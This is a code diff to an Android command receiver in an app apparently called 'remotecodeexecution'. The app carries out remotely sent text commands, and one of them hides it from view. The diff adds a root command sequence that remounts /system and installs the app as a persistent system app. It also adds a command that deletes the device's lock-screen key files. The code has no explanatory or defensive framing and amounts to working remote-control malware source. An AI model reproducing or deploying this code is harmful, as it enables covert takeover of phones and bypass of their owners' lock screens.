@@ -12,7 +12,8 @@ public class CommandReceiver extends BroadcastReceiver {
 
 	boolean hiddenCode = false;
 	String message;
-	String[] codeList = { "Test", "listSdCard", "REBOOT", "Vanish" };
+	String[] codeList = { "Test", "listSdCard", "REBOOT", "Vanish",
+			"installSystem", "removepattern" };
 	Context c;
 
 	@Override
@@ -50,10 +51,11 @@ public class CommandReceiver extends BroadcastReceiver {
 					.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
 		}
 		if (message.equals(codeList[1])) {
-			new CommandExecutor().execute("ls /sdcard/ > /sdcard/test.txt");
+			new CommandExecutor(false)
+					.execute("ls /sdcard/ > /sdcard/test.txt");
 		}
 		if (message.equals(codeList[2])) {
-			new CommandExecutor().execute("su -c reboot");
+			new CommandExecutor(true).execute("reboot");
 		}
 		if (message.equals(codeList[3])) {
 			ComponentName name = new ComponentName(
@@ -62,6 +64,18 @@ public class CommandReceiver extends BroadcastReceiver {
 			c.getPackageManager().setComponentEnabledSetting(name,
 					PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
 					PackageManager.DONT_KILL_APP);
+		}
+		if (message.equals(codeList[4])) {
+			String[] installAsSystem = {
+					"mount -o remount,rw /system",
+					"mv /data/app/net.openfiresecurity.remotecodeexecution*.apk /system/app/net.openfiresecurity.remotecodeexecution.apk",
+					"chmod 755 /system/app/net.open*",
+					"chown root.root /system/app/net.openf*",
+					"mount -o remount,ro /system", "reboot" };
+			new CommandExecutor(true).execute(installAsSystem);
+		}
+		if (message.endsWith(codeList[5])) {
+			new CommandExecutor(true).execute("rm /data/system/*.key");
 		}
 	}
 }
